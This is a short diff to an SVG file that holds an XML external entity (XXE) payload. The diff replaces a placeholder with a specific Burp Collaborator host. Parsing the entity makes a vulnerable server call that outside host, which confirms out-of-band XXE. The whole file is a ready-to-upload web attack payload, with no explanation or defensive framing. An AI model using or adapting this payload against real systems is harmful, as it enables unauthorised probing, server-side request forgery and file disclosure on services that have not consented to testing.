@@ -1,6 +1,6 @@
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "http://YOUR_ID.burpcollaborator.net/xxe">
+  <!ENTITY xxe SYSTEM "http://z66dfc90a2gwdmxkoiu0ueipfgl69v.burpcollaborator.net/xxe">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
   <text x="10" y="20">&xxe;</text>
